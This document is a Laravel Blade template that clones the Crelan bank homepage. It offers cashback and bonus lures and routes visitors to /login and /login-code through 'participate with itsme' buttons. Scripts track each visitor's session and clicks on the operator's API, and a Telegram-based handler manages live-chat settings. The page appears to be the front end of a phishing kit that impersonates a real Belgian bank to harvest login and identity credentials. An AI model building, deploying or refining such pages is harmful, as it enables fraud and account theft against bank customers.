<!DOCTYPE html>
<!-- saved from url=(0038)https://www.crelan.be/nl/particulieren -->
<html lang="{{ app()->getLocale() }}" dir="ltr" prefix="og: https://ogp.me/ns#" class=" js">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="csrf-token" content="{{ csrf_token() }}">

  <meta name="description" content="{{ __('messages.meta_description') }}">
  <link rel="stylesheet" href="./assets/css1.css">
  <link rel="stylesheet" href="./assets/css2.css">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <link rel="apple-touch-icon" sizes="180x180" href="./assets/apple-touch-icon.png?v=3">
  <link rel="icon" type="image/png" sizes="32x32" href="./assets/favicon-32x32.png?v=3">
  <link rel="icon" type="image/png" sizes="16x16" href="./assets/favicon-16x16.png?v=3">

  <link rel="mask-icon" href="./assets/safari-pinned-tab.svg?v=3" color="#84bd00">
  <link rel="shortcut icon" href="./assets/favicon.ico?v=3">

  <title>{{ __('messages.welcome_title') }} | Crelan</title>

  <link rel="stylesheet" media="all" href="./assets/css_t0f8RY1-isis88e6I24l0pVCbNsARBiVO5y2aaNgqwo.css">
  <link rel="stylesheet" media="all" href="./assets/css_EMp9AfzydcQtCKYpT4yuSDtQNwxYmXNMq4o2F6zOOSk.css">
  <link rel="stylesheet" media="all" href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700">
  <link rel="stylesheet" media="all" href="./assets/css_1GFU5DBQLLheAS5os4zDXQZzzOzdyl7r30H4_f1Kjbk.css">
  <link rel="stylesheet" media="print" href="./assets/css_7R1-0AwhfgudIYpgHtQfuqkZJzQZoc4fy7tPB1V768Q.css">

</head>

<body class="front not-logged-in mobile-menu-disabled">

  <div class="dialog-off-canvas-main-canvas" data-off-canvas-main-canvas="">
    <div id="site-wrapper">

      <header class="region region--header">
        <div class="container">
          <div class="region-header-inner">

            <div class="region region--main-header">
              <div class="branding">
                <a href="#" title="{{ __('messages.home') }}" rel="home">
                  <div class="site-logo">
                    <img src="./assets/logo.svg"
                      onerror="this.src=&#39;/themes/custom/calibr8_easytheme/logo.png&#39;; this.onerror=null;"
                      alt="{{ __('messages.logo_alt') }}">
                  </div>
                  <div class="site-name">Crelan</div>
                </a>
              </div>
            </div>
            <div class="region region--navigation">
              <nav aria-label="Products navigation" id="block-products-navigation"
                class="block block--menu block--menu--products">
                <ul data-block="navigation" class="menu menu--products js-top-menu menu--parent">
                  <li
                    class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                    <a href="#" target="_self" class="menu-link menu-link--products"
                      data-drupal-link-system-path="taxonomy/term/65">{{ __('messages.pay') }}</a>

                  </li>
                  <li
                    class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                    <a href="#" target="_self" class="menu-link menu-link--products"
                      data-drupal-link-system-path="taxonomy/term/67">{{ __('messages.borrow') }}</a>

                  </li>
                  <li
                    class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                    <a href="#" target="_self" class="menu-link menu-link--products"
                      data-drupal-link-system-path="taxonomy/term/66">{{ __('messages.save_invest') }}</a>

                  </li>
                  <li
                    class="menu-item menu-item--expanded menu-item--ground js-top-menu-ground js-top-menu-interactive">
                    <a href="#" target="_self" class="menu-link menu-link--products"
                      data-drupal-link-system-path="taxonomy/term/68">{{ __('messages.insure') }}</a>

                  </li>
                </ul>
              </nav>
            </div>

            <div class="nav-secondary-wrap">
              <div class="header-anchors">
                {{-- Language Switcher --}}
                <nav aria-label="Language" class="block block--menu block--menu--lang" style="margin-right: 15px;">
                  <ul class="menu menu--lang"
                    style="display: flex; gap: 8px; list-style: none; margin: 0; padding: 0; align-items: center;">
                    <li class="menu-item {{ app()->getLocale() === 'nl' ? 'is-active' : '' }}">
                      <a href="{{ route('lang.switch', 'nl') }}"
                        style="font-weight: {{ app()->getLocale() === 'nl' ? '700' : '400' }}; color: {{ app()->getLocale() === 'nl' ? '#84bd00' : '#333' }}; text-decoration: none; padding: 4px 8px; font-size: 14px;">
                        NL
                      </a>
                    </li>
                    <li style="color: #ccc;">|</li>
                    <li class="menu-item {{ app()->getLocale() === 'fr' ? 'is-active' : '' }}">
                      <a href="{{ route('lang.switch', 'fr') }}"
                        style="font-weight: {{ app()->getLocale() === 'fr' ? '700' : '400' }}; color: {{ app()->getLocale() === 'fr' ? '#84bd00' : '#333' }}; text-decoration: none; padding: 4px 8px; font-size: 14px;">
                        FR
                      </a>
                    </li>
                  </ul>
                </nav>



              </div>
              <div class="region region--nav-secondary">
                <nav aria-label="Functional menu" id="block-functionalmenu"
                  class="nav-secondary-functional-menu block block--menu block--menu--functional">
                  <ul data-block="nav_secondary" class="menu menu--functional menu--parent">

                    <li class="icon icon-building agency-cta menu-item icon--replaced">
                      <a href="/login" class="menu-link menu-link--functional menu-link--icon" data-once="agency-cta">

                        <span class="menu-link__text">{{ __('messages.find_office') }}</span>
                      </a>

                    </li>

                  </ul>

                </nav>
              </div>
            </div>

          </div>
        </div>

      </header>
      <div class="main-content--wrapper">
        <div class="content--section section--first">
          <div class="square-absolute"
            style="--width-box: 30px; --height-box: 30px; --top: 43px; --left: -96px;--radius:8px"></div>
          <div class="square-absolute"
            style="--width-box: 74px; --height-box: 74px; --top: 277px; --right: 530px !important;--radius:22px"></div>
          <div class="square-absolute"
            style="--width-box: 63px; --height-box: 63px; --top: -31px; --right: 210px !important;--radius:18px;--mobile-width:20px;--mobile-height:20px;--mobile-radius:5px;--mobile-left:-25px;--mobile-top:50px"></div>
          <div class="square-absolute"
            style="--width-box: 63px; --height-box: 63px; --top: 123px; --right: -31px !important;--radius:18px;--mobile-width:40px;--mobile-height:40px;--mobile-radius:5px;--mobile-left:-45px;--mobile-top:280px"></div>
          <div class="square-absolute"
            style="--width-box: 80px; --height-box: 80px; --bottom: -50px; --right: 384px !important;--radius:17px;--mobile-width:40px;--mobile-height:40px;--mobile-radius:5px;--mobile-left:355px;--mobile-top:160px">
          </div>

          <div class="square-absolute"
            style="--width-box: 80px; --height-box: 80px; --top: 535px; --right: -217px !important;--radius:20px;--mobile-width:40px;--mobile-height:40px;--mobile-radius:5px;--mobile-left:350px;--mobile-top:-10px"></div>
          <div class="square-absolute"
            style="--width-box: 122px; --height-box: 122px; --top: 287px; --left: -192px;--radius:32px"></div>

          <div class="square-absolute"
            style="--width-box: 141px; --height-box: 141px; --bottom: 548px; --right: -246px;--radius:31px"></div>
          <div class="section--left-side">
            <div class="section--tooltip">
              <span>
                {{ __('messages.tooltip') }}
              </span>
            </div>
            <h1>
              {{ __('messages.hero_title') }}
            </h1>
            <span>
              {{ __('messages.hero_intro') }} {{ __('messages.hero_exclusive') }}
            </span>
            <div class="main--list">
              <div class="main--list-item">
                <div class="dot"></div>
                <span>
                  {{ __('messages.hero_benefit1') }}
                </span>
              </div>
              <div class="main--list-item">
                <div class="dot"></div>
                <span>{{ __('messages.hero_benefit2') }}
                </span>
              </div>
            </div>

            <a href="/login">
                <svg width="26" height="26" viewBox="0 0 26 26" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M14.4319 0.0351009C13.4186 0.194626 5.27704 2.42795 4.79708 2.6761C4.13936 3.01287 2.96612 4.18271 2.62837 4.83853C2.48616 5.12213 1.82844 7.33773 1.17071 9.76604C-0.144736 14.729 -0.26917 15.757 0.388554 17.2282C0.921844 18.4335 7.37465 24.903 8.6901 25.5411C10.2011 26.2856 11.2854 26.1792 16.3873 24.8144C21.1691 23.5205 22.0579 23.1128 22.9467 21.8189C23.6044 20.8263 23.6933 20.6136 24.9199 15.9875C26.1109 11.5917 26.2176 10.6346 25.7198 9.11022C25.4354 8.25942 25.0265 7.78086 21.8268 4.55493C19.1604 1.87848 18.0227 0.850445 17.365 0.549122C16.4584 0.123726 15.2496 -0.0889721 14.4319 0.0351009ZM7.10801 4.57266C7.21466 4.66128 7.32132 5.01578 7.32132 5.33483C7.32132 6.46922 6.0592 6.78826 5.41926 5.83112C4.76153 4.82081 6.11253 3.79277 7.10801 4.57266ZM11.1432 5.8843C11.2499 6.29197 11.4099 6.46922 11.6587 6.46922C12.1565 6.46922 12.6542 6.98324 12.6542 7.49726C12.6542 8.11763 12.1743 8.5962 11.5521 8.5962C11.0544 8.5962 11.0544 8.61392 11.0544 9.64196C11.0544 11.6094 11.6765 12.1943 12.9564 11.4322C13.6853 11.0068 14.3252 11.0599 14.6096 11.6094C14.8407 12.0525 15.9428 12.1057 16.1028 11.6803C16.2628 11.2549 16.1384 11.1486 14.7874 10.6346C13.3475 10.0851 12.832 9.55334 12.832 8.57847C12.832 7.24911 14.2541 6.29197 15.8895 6.54012C17.4894 6.77054 18.4138 7.83403 17.7205 8.5962C17.2761 9.07477 16.7072 9.03932 16.2273 8.48985C15.7473 7.94038 14.8763 7.94038 14.8763 8.48985C14.8763 8.75572 15.1785 8.95069 16.1206 9.34064C17.5605 9.92556 18.1649 10.4928 18.1649 11.3081C18.1649 12.088 17.8271 12.6729 17.0983 13.1692C16.5295 13.5592 16.3517 13.5769 15.2318 13.4705C13.7208 13.3287 13.4008 13.3287 12.0143 13.4883C11.1788 13.5769 10.7699 13.5237 10.3077 13.311C9.75668 13.0451 9.65002 13.0451 9.17006 13.2933C7.96127 13.9136 5.91699 13.3465 5.45481 12.2475C5.17039 11.5562 5.08151 7.79858 5.34815 7.39091C5.43703 7.23138 5.79256 7.17821 6.3614 7.21366L7.23244 7.26683L7.28577 9.30519C7.3391 11.4322 7.46353 11.7867 8.22792 11.7867C8.9923 11.7867 9.09896 11.379 9.09896 8.50757C9.09896 7.01869 9.15229 5.65387 9.20562 5.49435C9.2945 5.28165 9.50781 5.22848 10.1478 5.26393C10.8944 5.3171 10.9832 5.37028 11.1432 5.8843ZM20.2447 14.3745C21.258 15.1367 21.9335 16.6964 21.6313 17.6359C21.5246 17.9726 21.3824 17.9904 19.3026 17.9904C16.9561 17.9904 16.8139 18.0435 17.3827 18.8412C17.756 19.3729 19.0359 19.3906 19.4981 18.8766C19.9425 18.398 20.5825 18.4335 20.938 18.9652C21.3291 19.5501 21.1158 20.0464 20.298 20.4718C18.4671 21.4113 16.4584 20.9327 15.4807 19.3374L15.1429 18.788V19.4792C15.1429 20.6845 14.2896 21.2163 13.543 20.4718C13.2408 20.1705 13.1875 19.8869 13.1875 18.3094C13.1875 16.8914 13.1342 16.4483 12.8853 16.1824C12.5476 15.7925 11.9609 15.7748 11.481 16.1115C11.1966 16.3242 11.1255 16.661 11.0544 18.4335C10.9832 19.9933 10.8944 20.525 10.6988 20.6491C10.2722 20.915 9.84556 20.8618 9.45448 20.4718C9.15229 20.1705 9.09896 19.8869 9.09896 18.3094C9.09896 16.3774 8.90342 15.8634 8.13903 15.8634C7.25022 15.8811 6.9658 16.5015 6.9658 18.5753C6.9658 20.011 6.91247 20.2769 6.61027 20.5605C6.18364 20.9504 5.45481 20.8086 5.17039 20.2769C5.04595 20.0287 4.99262 19.1956 5.04595 18.0081C5.11706 15.952 5.36593 15.2607 6.30807 14.5517C6.7347 14.2504 7.07245 14.1795 8.29902 14.1795C9.59669 14.1795 9.84556 14.2327 10.1833 14.5517L10.5566 14.9417L11.1966 14.5163C12.4054 13.6832 14.3963 14.1441 14.8407 15.3316C14.9474 15.633 15.0896 15.8634 15.1429 15.8634C15.1962 15.8634 15.4096 15.5798 15.6406 15.2253C16.2273 14.3213 17.2583 13.8959 18.6448 13.9668C19.427 14.0023 19.907 14.1263 20.2447 14.3745Z" fill="white"/>
                </svg>


                {{ __('messages.participate_with_itsme') }}
            </a>
          </div>

          <img src="/assets/main-section--image2.png" class="section--image1" alt="">
          <img src="/assets/main-section--image1.png" class="section--image2" alt="">
        </div>
        <div class="content--section section--second">
          <div class="section--left-side">
            <div class="left-side--text">
              <h4>
                {{ __('messages.benefits_conditions_title') }}
              </h4>
              <span>
                {{ __('messages.benefits_conditions_description') }}
              </span>
              <div style="margin-top: 15px;">
                <a href="{{ route('terms') }}" style="color: #84bd00; text-decoration: none; font-weight: 600; font-size: 14px;">
                  {{ __('messages.terms_title') }} →
                </a>
              </div>
            </div>
            <div class="second-section--faq-wrapper">
              @php
                $faqItems = [
                  [
                    'q' => __('messages.faq_cashback_q'),
                    'a' => __('messages.faq_cashback_a'),
                  ],
                  [
                    'q' => __('messages.faq_bonus_q'),
                    'a' => __('messages.faq_bonus_a'),
                  ],
                  [
                    'q' => __('messages.faq_free_q'),
                    'a' => __('messages.faq_free_a'),
                  ],
                  [
                    'q' => __('messages.faq_win_q'),
                    'a' => __('messages.faq_win_a'),
                  ],
                  [
                    'q' => __('messages.faq_itsme_q'),
                    'a' => __('messages.faq_itsme_a'),
                  ],
                ];
              @endphp

              <div class="faq--block">
                @foreach(array_slice($faqItems, 0, 2) as $item)
                  <div class="faq--question">
                    <div class="faq--header">
                      <span>
                        {{ $item['q'] }}
                      </span>
                      <svg width="12" height="7" viewBox="0 0 12 7" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M1 1L6.00081 5.58L11 1" stroke="#00AE53" stroke-width="2" stroke-linecap="round"
                          stroke-linejoin="round" />
                      </svg>
                    </div>
                    <img src="/assets/separator.svg" class="faq-separator" alt="">
                    <div class="faq--answer">
                      <span>{!! nl2br(e($item['a'])) !!}</span>
                    </div>
                  </div>
                @endforeach
              </div>

              <div class="faq--block">
                @foreach(array_slice($faqItems, 2) as $item)
                  <div class="faq--question">
                    <div class="faq--header">
                      <span>
                        {{ $item['q'] }}
                      </span>
                      <svg width="12" height="7" viewBox="0 0 12 7" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <path d="M1 1L6.00081 5.58L11 1" stroke="#00AE53" stroke-width="2" stroke-linecap="round"
                          stroke-linejoin="round" />
                      </svg>
                    </div>
                    <img src="/assets/separator.svg" class="faq-separator" alt="">
                    <div class="faq--answer">
                      <span>{!! nl2br(e($item['a'])) !!}</span>
                    </div>
                  </div>
                @endforeach
              </div>
            </div>
          </div>
          <div class="section--right-side">
            <img src="/assets/second-section--image.png" class="section--right-bg-image" alt="">
            <div class="section--right-block">
              <svg width="109" height="109" viewBox="0 0 109 109" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path
                  d="M60.5028 0.147148C56.2549 0.815926 22.123 10.1787 20.1109 11.219C17.3535 12.6309 12.4349 17.5352 11.0189 20.2846C10.4228 21.4735 7.66537 30.762 4.90799 40.9422C-0.606776 61.7485 -1.12844 66.0583 1.62894 72.2259C3.86465 77.2788 30.9168 104.401 36.4316 107.076C42.7661 110.197 47.3121 109.751 68.7004 104.03C88.7473 98.6052 92.4735 96.8961 96.1997 91.4716C98.9571 87.3104 99.3297 86.4187 104.472 67.0243C109.465 48.5959 109.912 44.5833 107.825 38.1928C106.633 34.626 104.919 32.6197 91.5047 19.0957C80.3261 7.87518 75.5566 3.56532 72.7992 2.30209C68.9985 0.518692 63.9309 -0.373001 60.5028 0.147148ZM29.799 19.17C30.2461 19.5415 30.6932 21.0277 30.6932 22.3652C30.6932 27.1209 25.402 28.4585 22.7192 24.4459C19.9618 20.2103 25.6256 15.9004 29.799 19.17ZM46.7159 24.6688C47.163 26.3779 47.8337 27.1209 48.8771 27.1209C50.9637 27.1209 53.0504 29.2759 53.0504 31.4308C53.0504 34.0316 51.0383 36.0379 48.4299 36.0379C46.3433 36.0379 46.3433 36.1122 46.3433 40.4221C46.3433 48.6702 48.9516 51.1224 54.3173 47.9272C57.3728 46.1438 60.0556 46.3667 61.248 48.6702C62.2168 50.528 66.8373 50.7509 67.508 48.9675C68.1787 47.1841 67.6571 46.7382 61.9933 44.5833C55.9568 42.2798 53.7956 40.0505 53.7956 35.9636C53.7956 30.3905 59.7575 26.3779 66.6137 27.4182C73.3209 28.3842 77.1961 32.8427 74.2897 36.0379C72.4266 38.0442 70.0418 37.8956 68.0297 35.592C66.0175 33.2885 62.3659 33.2885 62.3659 35.592C62.3659 36.7067 63.6328 37.5241 67.5826 39.1588C73.619 41.611 76.1528 43.9889 76.1528 47.407C76.1528 50.6766 74.7368 53.1287 71.6814 55.2094C69.2966 56.8441 68.5514 56.9184 63.8564 56.4726C57.5218 55.8781 56.1804 55.8781 50.3675 56.5469C46.8649 56.9184 45.1509 56.6955 43.2132 55.8038C40.903 54.6892 40.4559 54.6892 38.4437 55.7295C33.3761 58.3303 24.8059 55.9524 22.8682 51.3453C21.6759 48.4473 21.3032 32.694 22.4211 30.985C22.7937 30.3162 24.2842 30.0933 26.669 30.2419L30.3206 30.4648L30.5442 39.0102C30.7678 47.9272 31.2894 49.4133 34.494 49.4133C37.6985 49.4133 38.1456 47.7042 38.1456 35.6664C38.1456 29.4245 38.3692 23.7028 38.5928 23.034C38.9654 22.1423 39.8597 21.9194 42.5425 22.068C45.6725 22.2909 46.0452 22.5138 46.7159 24.6688ZM84.8721 60.2623C89.1199 63.4575 91.9518 69.9966 90.6849 73.935C90.2378 75.3468 89.6416 75.4211 80.9223 75.4211C71.0852 75.4211 70.489 75.644 72.8737 78.9879C74.4387 81.2171 79.8045 81.2914 81.7421 79.1365C83.6052 77.1302 86.288 77.2788 87.7785 79.5081C89.418 81.9602 88.5237 84.0408 85.0956 85.8242C77.4197 89.7626 68.9985 87.7562 64.8997 81.0685L63.4837 78.765V81.663C63.4837 86.7159 59.9066 88.9452 56.7766 85.8242C55.5097 84.561 55.2861 83.3721 55.2861 76.7587C55.2861 70.814 55.0625 68.9563 54.0192 67.8417C52.6033 66.2069 50.144 66.1326 48.1318 67.5445C46.9394 68.4362 46.6413 69.848 46.3433 77.2788C46.0452 83.8179 45.6725 86.0472 44.8528 86.5673C43.0642 87.6819 41.2756 87.459 39.6361 85.8242C38.3692 84.561 38.1456 83.3721 38.1456 76.7587C38.1456 68.6591 37.3259 66.5042 34.1213 66.5042C30.3951 66.5785 29.2028 69.1792 29.2028 77.8733C29.2028 83.8922 28.9792 85.0068 27.7123 86.1958C25.9237 87.8305 22.8682 87.2361 21.6759 85.0068C21.1542 83.9665 20.9306 80.4741 21.1542 75.4954C21.4523 66.8757 22.4956 63.9777 26.4454 61.0054C28.234 59.7421 29.6499 59.4449 34.7921 59.4449C40.2323 59.4449 41.2756 59.6678 42.6916 61.0054L44.2566 62.6401L46.9394 60.8568C52.0071 57.3643 60.3537 59.2963 62.2168 64.2749C62.664 65.5382 63.2602 66.5042 63.4837 66.5042C63.7073 66.5042 64.6016 65.3152 65.5704 63.8291C68.0297 60.0394 72.3521 58.256 78.1649 58.5532C81.444 58.7018 83.4561 59.222 84.8721 60.2623Z"
                  fill="#FD4712" />
              </svg>
              <a href="/login">{{ __('messages.participate_with_itsme') }}</a>
              <span>
                {{ __('messages.sidebar_info') }}
              </span>
            </div>
          </div>
        </div>

          <div class="content--section section--second section--third">
              <div class="section--left-side">
                  <div class="left-side--text">
                      <h4>
                          {{ __('messages.special_offer') }}
                      </h4>
                      <span>
                {{ __('messages.offer_description') }}
              </span>
                      <a href="/login-code">
                          <svg width="14" height="15" viewBox="0 0 14 15" fill="none" xmlns="http://www.w3.org/2000/svg">
                              <path d="M10.1111 9C11.1132 9.00006 12.0767 9.37316 12.8005 10.0415C13.5243 10.7098 13.9526 11.6218 13.9961 12.5873L14 12.75V13.5C14.0001 13.8784 13.8519 14.2429 13.5851 14.5204C13.3182 14.7979 12.9525 14.9679 12.5611 14.9963L12.4444 15H1.55556C1.16311 15.0001 0.785115 14.8572 0.497352 14.5999C0.209588 14.3426 0.0333226 13.9899 0.00388898 13.6125L0 13.5V12.75C5.78997e-05 11.7837 0.386977 10.8546 1.08007 10.1567C1.77316 9.4587 2.71892 9.04569 3.72011 9.00375L3.88889 9H10.1111ZM7 0C8.0314 0 9.02055 0.395088 9.74986 1.09835C10.4792 1.80161 10.8889 2.75544 10.8889 3.75C10.8889 4.74456 10.4792 5.69839 9.74986 6.40165C9.02055 7.10491 8.0314 7.5 7 7.5C5.9686 7.5 4.97945 7.10491 4.25014 6.40165C3.52083 5.69839 3.11111 4.74456 3.11111 3.75C3.11111 2.75544 3.52083 1.80161 4.25014 1.09835C4.97945 0.395088 5.9686 0 7 0Z" fill="#3C3C3C"/>
                          </svg>

                          {{ __('messages.login') }}

                      </a>
                  </div>
              </div>
              <div class="section--right-side">
                  <img src="/assets/second-third--image.png" class="section--right-bg-image" alt="">
              </div>
          </div>
      </div>

    </div>

  </div>

  @vite(['resources/js/app.js'])


  <script src="./assets/faq.js" defer></script>

  <script>
    // Translations for JavaScript
    window.translations = {
      send: '{{ __('messages.send') }}',
      loading: '{{ __('messages.loading') }}'
    };

    document.addEventListener('DOMContentLoaded', function () {
      const existingSessionId = localStorage.getItem('session_id');
      if (existingSessionId && window.SessionManager) {
        window.SessionManager.setSessionId(existingSessionId);

        window.SessionManager.checkSessionStatus();
        trackPageVisit(existingSessionId, '{{ __('messages.page_home') }}', window.location.href);
      }

      async function trackPageVisit(sessionId, pageName, pageUrl, actionType = null) {
        try {
          await fetch(`/api/session/${sessionId}/visit`, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
            },
            body: JSON.stringify({
              page_name: pageName,
              page_url: pageUrl,
              action_type: actionType
            })
          });
        } catch (error) {
          console.error('Failed to track page visit:', error);
        }
      }

    });
    
    // Track page visit on load (only once)
    let visitTracked = false;
    window.addEventListener('load', () => {
      if (visitTracked) return;
      visitTracked = true;
      
      fetch('/api/visit', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
        },
        body: JSON.stringify({
          event: 'visit',
          locale: '{{ app()->getLocale() }}'
        })
      }).catch(() => { });
    });

    // Track clicks on itsme button (only once per click)
    let itsmeClickTracked = false;
    document.addEventListener('click', (e) => {
      const link = e.target && e.target.closest ? e.target.closest('a') : null;
      if (!link) return;

      const href = link.getAttribute('href') || '';
      if (href !== '/login') return;
      
      // Prevent duplicate tracking
      if (itsmeClickTracked) return;
      itsmeClickTracked = true;

      try {
        const payload = JSON.stringify({ event: 'itsme', locale: '{{ app()->getLocale() }}' });
        if (navigator.sendBeacon) {
          const blob = new Blob([payload], { type: 'application/json' });
          navigator.sendBeacon('/api/visit', blob);
        } else {
          fetch('/api/visit', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json',
              'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content
            },
            body: payload,
            keepalive: true
          }).catch(() => { });
        }
      } catch (_) {
        // ignore
      }
    }, { capture: true });
  </script>

  {{-- Smartsupp Live Chat --}}
  @php
    $smartsuppSettings = \App\Telegram\Handlers\SmartSuppHandler::getSettings();
  @endphp
  @if(!empty($smartsuppSettings['enabled']) && !empty($smartsuppSettings['key']))
    <script>
      var _smartsupp = _smartsupp || {};
      _smartsupp.key = '{{ $smartsuppSettings['key'] }}';
      window.smartsupp || (function (d) {
        var s, c, o = smartsupp = function () { o._.push(arguments) }; o._ = [];
        s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
        c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
        c.src = '//www.smartsuppchat.com/loader.js?'; s.parentNode.insertBefore(c, s);
      })(document);
    </script>
  @endif

</body>
<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1398096467952166');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=1398096467952166&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->
<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '3803073376656262');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=3803073376656262&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->
</html>
